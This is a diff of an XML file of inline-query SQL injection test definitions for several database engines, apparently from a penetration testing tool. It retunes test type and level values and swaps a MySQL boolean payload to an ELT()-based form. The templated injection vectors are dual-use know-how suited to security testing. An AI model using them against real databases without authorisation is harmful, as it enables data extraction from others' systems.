@@ -4,14 +4,18 @@
     <!-- Inline queries tests -->
     <test>
         <title>MySQL inline queries</title>
-        <stype>6</stype>
+        <stype>3</stype>
         <level>1</level>
         <risk>1</risk>
         <clause>1,2,3,8</clause>
         <where>3</where>
         <vector>(SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
         <request>
+            <!-- These work as good as ELT(), but are longer
             <payload>(SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+            <payload>(SELECT CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+            -->
+            <payload>(SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -23,7 +27,7 @@
 
     <test>
         <title>PostgreSQL inline queries</title>
-        <stype>6</stype>
+        <stype>3</stype>
         <level>1</level>
         <risk>1</risk>
         <clause>1,2,3,8</clause>
@@ -42,7 +46,7 @@
 
     <test>
         <title>Microsoft SQL Server/Sybase inline queries</title>
-        <stype>6</stype>
+        <stype>3</stype>
         <level>1</level>
         <risk>1</risk>
         <clause>1,2,3,8</clause>
@@ -63,8 +67,8 @@
 
     <test>
         <title>Oracle inline queries</title>
-        <stype>6</stype>
-        <level>1</level>
+        <stype>3</stype>
+        <level>2</level>
         <risk>1</risk>
         <clause>1,2,3,8</clause>
         <where>3</where>
@@ -82,8 +86,8 @@
 
     <test>
         <title>SQLite inline queries</title>
-        <stype>6</stype>
-        <level>1</level>
+        <stype>3</stype>
+        <level>3</level>
         <risk>1</risk>
         <clause>1,2,3,8</clause>
         <where>3</where>
@@ -100,8 +104,8 @@
     </test>
     <test>
         <title>Firebird inline queries</title>
-        <stype>6</stype>
-        <level>2</level>
+        <stype>3</stype>
+        <level>3</level>
         <risk>1</risk>
         <clause>1,2,3,8</clause>
         <where>3</where>
